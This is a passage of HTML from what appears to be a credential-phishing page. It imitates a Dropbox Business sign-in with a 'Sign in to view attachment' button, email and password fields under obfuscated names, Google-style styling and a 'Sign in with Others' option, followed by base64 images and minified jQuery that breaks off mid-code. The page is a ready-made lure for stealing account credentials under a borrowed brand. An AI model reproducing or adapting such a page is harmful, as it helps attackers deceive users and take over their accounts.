ySI05UaFSWGBZXmNJaqKfoaVcfcDOz9BUc8hVd8pCVJU0TaBPZ7k/XLI5TYlZcsVYc8wmM0JkgrEgM3RTcM4yQV5ZddD///8rZW5nAAABAHRSTlP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AU/cHJQAAA8dJREFUeNpi+I8CNvqUJE09JnLjQWW+MVdxosj//wz///scW29zv5IRKGApKsXtWBN5pQ4IImsia0Jq5YAKjmVycz965Ojo+PjxY6+amsjINSEh27fzrqxdYbVyxWuggq3Gy5+s2c7bY8IcXMFnFKsMBIGTA5WVDZycTEzWABUYSwkZAIGTrq7TPLvbOt9Oyabp6gqBgNMKk6tABYmvhXSdDAx03STu8fPnFTV3HZi1SFa508goUDnVai5QQfErA6dAPj6JPTwyec0RHp6e1d7VwjrtRnyBnT1WXkAFZsuVnZT5fu2V5u8/u8Pv9+/pL7W9m4QXtRsFGvVYPQEqYDmt7GTwK0e663NWry7Qdl1dzRez2tjEOjv5ViQvByqwvDpZl32vdL917+SWhEV67X/jFlqozWorKFQ2Mkl2BCkIMehs5Omy7l0V5N8ccSBFwOPkhCm5UbPE3A2SrV4BFZhu12XPkfm8dlXjwZMebMLCs5r+BQhd81wmP9mJGaxAkNcgiMdzZ1p4GVPB0wWSwkuXxsS5uzG0NbgJ9VlxgxT0zNsm83WtBD9T9Qwnd7eOpW3msoHt7zZsWC3UZwJSIGr1l8d/mqbhISYtTWB4cMy+1bA6tv1uaytIgRRIQd9mmYhdshfV1dWm8PFVvFNZLN8e+zNIYf98ob4VEAU6/NUaCw9HR88w4OssNyydKBnrzi6wxDZQSDVVFOSG4M1FbDu3MHn/223AF8iu9H3iKfeKS62T4tydVGsFwQoWNrPt6vbsmH1dKJBP8dYcldXuLkrfv2xShilQLfSonsba1LZUfMGmZ0rZc1JkXQRKJznHBhr0rTQFKWCeXNWvpSkZM6HhgyHD/uzsUIaJpRPjYo0CDZghCkx0xfrNp2uKF2jvs9efqZDtMGdxvIXulCkGBsy1lmAFTvOXFdifmHIzQFxStjD3yznb52lCCVpaAZP7UlnACgx09WK07adr9gJTmbty2mQh3QUcRyaqnxJSrYUqEDKQ/LOvQP/MjBNZmpqarN1vwpVKoz+BfAFXYHSnvr7qh7f3x48XGO7dUypVmSjJ526QAbXCSVfISWi15ATzDa1Lbt261do6aZK8c2ynsgHzChZwZAGtdjIQcnJz/iYuP2H/hHPizwuFQAkfqqB4pWofEKgCs01sZ/t8t/mTQVnESQiYGZhNQAqmuh5fty49g5k52coqmblPFQaCw8KYTc6DM+97G998xsvnTaVc526vZU4PO34cqCGjPNkqY50ISAFa7uc8uv5h5dutl1lEXU3X//8PEGAApOe53a4YH6gAAAAASUVORK5CYII="
						data-description="Sign in with Others">Others</option></select>
						 <br/>
					 <label class="hidden-label" for="Email">Email</label>

			<span id="sprytextfield1">
			<input id="Email" required name="adc3949ba59abbe56e057" type="email"
				   placeholder="Email"
				   value=""
				   spellcheck="false"
				   class="">
			<span class="textfieldRequiredMsg">Enter your email.</span><span class="textfieldInvalidFormatMsg">Enter a valid email.</span></span>
			<label class="hidden-label" for="Passwd">Password</label>
			<span id="sprypassword1">
			<input id="Passwd" required name="VGsFwQoWNrPt6vbsmH1dKJBP8dYcld" type="password"
				   placeholder="Password"
				   class="">
			<span class="passwordRequiredMsg">Enter your password.</span></span>
			<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in to view attachment">
			  <label class="remember">
			  <input id="PersistentCookie" name="PersistentCookie"
							 type="checkbox" value="yes">
			  <span>
			  Stay signed in
			  </span>
			  </label>
			  <input type="hidden" name="rmShown" value="1">
			  <a id="link-forgot-passwd" href="#"
				   class="need-help-reverse"
				   >
			  Need help?
			  </a>
			</form>
			</div>
			<div class="one-google">
			<p class="tagline">
				Join the 200,000 companies that use Dropbox Business
			</p>
			<img src=" data:image/jpeg;base64,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" width="576" height="50" alt="">
			</div>
			<div>
			<div class="">

			</div>
			</div>
			  </div>
			  <div class="google-footer-bar">
			  <div class="footer content clearfix">
			  <ul id="footer-list">
			  <li>
			  Dropbox Business
			  </li>
			  <li>
			  <a href="#" target="_blank">
			  Privacy &amp; Terms
			  </a>
			  </li>
			  <li>
			  <a href="#" target="_blank">
			  Help
			  </a>
			  </li>
			  </ul>
			  </div>
			  </div>
			</div>
			  </div>
			  
			  <script type="text/javascript">
			  /*! jQuery v1.7.2 jquery.com | jquery.org/license */
			(function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cu(a){if(!cj[a]){var b=c.body,d=f("<"+a+">").appendTo(b),e=d.css("display");d.remove();if(e==="none"||e===""){ck||(ck=c.createElement("iframe"),ck.frameBorder=ck.width=ck.height=0),b.appendChild(ck);if(!cl||!ck.createElement)cl=(ck.contentWindow||ck.contentDocument).document,cl.write((f.support.boxModel?"<!doctype html>":"")+"<html><body>"),cl.close();d=cl.createElement(a),cl.body.appendChild(d),e=f.css(d,"display"),b.removeChild(ck)}cj[a]=e}return cj[a]}function ct(a,b){var c={};f.each(cp.concat.apply([],cp.slice(0,b)),function(){c[this]=a});return c}function cs(){cq=b}function cr(){setTimeout(cs,0);return cq=f.now()}function ci(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ch(){try{return new a.XMLHttpRequest}catch(b){}}function cb(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function ca(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function b_(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bD.test(a)?d(a,e):b_(a+"["+(typeof e=="object"?b:"")+"]",e,c,d)});else if(!c&&f.type(b)==="object")for(var e in b)b_(a+"["+e+"]",b[e],c,d);else d(a,b)}function b$(a,c){var d,e,g=f.ajaxSettings.flatOptions||{};for(d in c)c[d]!==b&&((g[d]?a:e||(e={}))[d]=c[d]);e&&f.extend(!0,a,e)}function bZ(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bS,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=bZ(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=bZ(a,c,d,e,"*",g));return l}function bY(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bO),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bB(a,b,c){var d=b==="width"?a.offsetWidth:a.offsetHeight,e=b==="width"?1:0,g=4;if(d>0){if(c!=="border")for(;e<g;e+=2)c||(d-=parseFloat(f.css(a,"padding"+bx[e]))||0),c==="margin"?d+=parseFloat(f.css(a,c+bx[e]))||0:d-=parseFloat(f.css(a,"border"+bx[e]+"Width"))||0;return d+"px"}d=by(a,b);if(d<0||d==null)d=a.style[b];if(bt.test(d))return d;d=parseFloat(d)||0;if(c)for(;e<g;e+=2)d+=parseFloat(f.css(a,"padding"+bx[e]))||0,c!=="padding"&&(d+=parseFloat(f.css(a,"border"+bx[e]+"Width"))||0),c==="margin"&&(d+=parseFloat(f.css(a,c+bx[e]))||0);return d+"px"}function bo(a){var b=c.createElement("div");bh.appendChild(b),b.innerHTML=a.outerHTML;return b.firstChild}function bn(a){var b=(a.nodeName||"").toLowerCase();b==="input"?bm(a):b!=="script"&&typeof a.getElementsByTagName!="undefined"&&f.grep(a.getElementsByTagName("input"),bm)}function bm(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bl(a){return typeof a.getElementsByTagName!="undefined"?a.getElementsByTagName("*"):typeof a.querySelectorAll!="undefined"?a.querySelectorAll("*"):[]}function bk(a,b){var c;b.nodeType===1&&(b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase(),c==="object"?b.outerHTML=a.outerHTML:c!=="input"||a.type!=="checkbox"&&a.type!=="radio"?c==="option"?b.selected=a.defaultSelected:c==="input"||c==="textarea"?b.defaultValue=a.defaultValue:c==="script"&&b.text!==a.text&&(b.text=a.text):(a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value)),b.removeAttribute(f.expando),b.removeAttribute("_submit_attached"),b.removeAttribute("_change_attached"))}function bj(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c,d,e,g=f._data(a),h=f._data(b,g),i=g.events;if(i){delete h.handle,h.events={};for(c in i)for(d=0,e=i[c].length;d<e;d++)f.event.add(b,c,i[c][d])}h.data&&(h.data=f.extend({},h.data))}}function bi(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function U(a){var b=V.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}function T(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(O.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function S(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function K(){return!0}function J(){return!1}function n(a,b,c){var 